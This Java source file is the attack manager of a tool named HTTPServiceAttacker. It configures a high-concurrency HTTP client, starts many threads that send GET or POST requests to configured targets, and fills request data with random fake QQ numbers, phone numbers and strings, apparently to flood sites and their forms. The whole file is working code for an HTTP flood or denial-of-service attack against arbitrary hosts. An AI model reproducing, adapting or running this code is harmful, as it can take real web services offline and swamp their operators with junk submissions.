package com.ishland.app.HTTPServiceAttacker.attacker;

import com.ishland.app.HTTPServiceAttacker.attacker.threads.AttackerThread;
import com.ishland.app.HTTPServiceAttacker.attacker.threads.MonitorThread;
import com.ishland.app.HTTPServiceAttacker.configuration.Configuration;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.hc.client5.http.ConnectionKeepAliveStrategy;
import org.apache.hc.client5.http.config.RequestConfig;
import org.apache.hc.client5.http.impl.async.CloseableHttpAsyncClient;
import org.apache.hc.client5.http.impl.async.HttpAsyncClients;
import org.apache.hc.client5.http.impl.nio.PoolingAsyncClientConnectionManager;
import org.apache.hc.core5.http.HeaderElement;
import org.apache.hc.core5.http.impl.DefaultConnectionReuseStrategy;
import org.apache.hc.core5.http.message.BasicHeaderElementIterator;
import org.apache.hc.core5.reactor.IOReactorConfig;
import org.apache.hc.core5.util.TimeValue;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.TimeUnit;

public class Attack {

    private static final Logger logger = LoggerFactory
            .getLogger("Attack manager");
    public static final ArrayList<AttackerThread> thrs = new ArrayList<>();
    public static CloseableHttpAsyncClient httpClient = null;
    public static final int maxConnectionPerThread = 4096;
    public static Configuration config = null;
    private static MonitorThread monitorThread = null;
    private static IOReactorConfig ioReactorConfig = null;
    private static PoolingAsyncClientConnectionManager cm = null;

    public static void initClient(int threads) {
        ioReactorConfig = IOReactorConfig.custom()
                .setSoKeepAlive(true)
                .setSoReuseAddress(true)
                .setTcpNoDelay(true)
                .build();
        cm = new PoolingAsyncClientConnectionManager();
        cm.setMaxTotal(threads * Attack.maxConnectionPerThread);
        cm.setDefaultMaxPerRoute(threads * Attack.maxConnectionPerThread);
        RequestConfig defaultRequestConfig = RequestConfig.custom()
                .setConnectTimeout(30000, TimeUnit.MILLISECONDS)
                .setConnectionRequestTimeout(30000, TimeUnit.MILLISECONDS)
                .setResponseTimeout(30000, TimeUnit.MILLISECONDS)
                .build();

        ConnectionKeepAliveStrategy myStrategy = (response, context) -> {
            BasicHeaderElementIterator it = new BasicHeaderElementIterator(
                    response.headerIterator("connection"));
            while (it.hasNext()) {
                HeaderElement he = it.next();
                String param = he.getName();
                String value = he.getValue();
                if (value != null && param.equalsIgnoreCase("timeout")) {
                    return TimeValue.ofSeconds(Long.parseLong(value));
                }
            }
            return TimeValue.ofSeconds(60);
        };
        httpClient = HttpAsyncClients.custom()
                .setConnectionReuseStrategy(
                        new DefaultConnectionReuseStrategy())
                .setKeepAliveStrategy(myStrategy)
                .setDefaultRequestConfig(defaultRequestConfig)
                .setConnectionManager(cm)
                .setIOReactorConfig(ioReactorConfig)
                .build();
        httpClient.start();
    }

    public static void startAttack() throws IllegalAccessException {
        logger.info("Starting attack...");
        if (getConfig() == null)
            throw new IllegalAccessException("Configuration is not set!");
        monitorThread = new MonitorThread();
        monitorThread.start();
        int totalthreads = 0;
        for (int i = 0; i < getConfig().getTarget().size(); i++)
            totalthreads += Integer
                    .parseInt(String.valueOf(
                            getConfig().getTarget().get(i).get("threads")));
        Attack.initClient(totalthreads);
        for (Map<String, Object> itallmap : getConfig().getTarget()) {
            for (long i = 0; i < Long
                    .parseLong(String.valueOf(itallmap.get("threads"))); i++) {
                AttackerThread thr = new AttackerThread();
                if (itallmap.get("mode") == "POST")
                    thr.setMethod(AttackerThread.POST);
                else
                    thr.setMethod(AttackerThread.GET);
                thr.setTarget(String.valueOf(itallmap.get("addr")));
                thr.setData(String.valueOf(itallmap.get("data")));
                thr.setShowExceptions(getConfig().isShowExceptions());
                thr.setReferer(String.valueOf(itallmap.get("referer")));
                thr.start();
                thrs.add(thr);
            }
        }
        logger.info("Attack started.");
    }

    public static void stopAttack() {
        logger.info("Sending stop signal to all attacker threads...");
        Iterator<AttackerThread> it = thrs.iterator();
        while (it.hasNext())
            it.next().stopTask();
        logger.info("Waiting for all the threads to die...");
        it = thrs.iterator();
        while (it.hasNext()) {
            AttackerThread thr = it.next();
            try {
                thr.join();
            } catch (InterruptedException e) {
                logger.warn("Could not wait for " + thr.getName() + " to die",
                        e);
            }
        }
        ioReactorConfig = null;
        if (httpClient != null)
            try {
                httpClient.close();
            } catch (IOException ignored) {
            }
        httpClient = null;
        cm = null;
        if (monitorThread != null) {
            monitorThread.stopTask();
            try {
                monitorThread.join();
            } catch (InterruptedException e) {
                logger.warn("Could not wait for Monitor Thread to die", e);
            }
        }
        try {
            Thread.sleep(100);
        } catch (InterruptedException ignored) {
        }
        MonitorThread.logging.run();
        monitorThread = null;
        logger.info("Attack stopped.");
    }

    public static String replacePlaceHolders(String origin) {
        String result = origin;
        if (result.contains("[QQ]"))
            result = result.replaceAll("\\[QQ]",
                    RandomStringUtils.randomNumeric(5, 10));
        if (result.contains("[86Phone]"))
            result = result.replaceAll("\\[86Phone]",
                    "1" + RandomStringUtils.randomNumeric(10));
        if (result.contains("[time_sec]"))
            result = result.replaceAll("\\[time_sec]",
                    String.valueOf(System.currentTimeMillis() / 1000));
        boolean hasAscii = result.matches("\\[Ascii_.+]");
        boolean hasNumber = result.matches("\\[Number_.+]");
        boolean hasAlpha = result.matches("\\[Alpha_.+]");
        boolean hasNumAlp = result.matches("\\[NumAlp_.+]");
        if (hasAscii || hasNumber || hasAlpha || hasNumAlp)
            for (int i = 1; i <= 16; i++) {
                if (hasAscii)
                    result = result.replaceAll("\\[Ascii_" + i + "]",
                            RandomStringUtils.randomAscii(i));
                if (hasNumber)
                    result = result.replaceAll("\\[Number_" + i + "]",
                            RandomStringUtils.randomNumeric(i));
                if (hasAlpha)
                    result = result.replaceAll("\\[Alpha_" + i + "]",
                            RandomStringUtils.randomAlphabetic(i));
                if (hasNumAlp)
                    result = result.replaceAll("\\[NumAlp_" + i + "]",
                            RandomStringUtils.randomAlphanumeric(i));
            }
        return result;
    }

    /**
     * @return the config
     */
    public static Configuration getConfig() {
        return config;
    }

    /**
     * @param config the config to set
     */
    public static void setConfig(Configuration config) {
        Attack.config = config;
    }

}
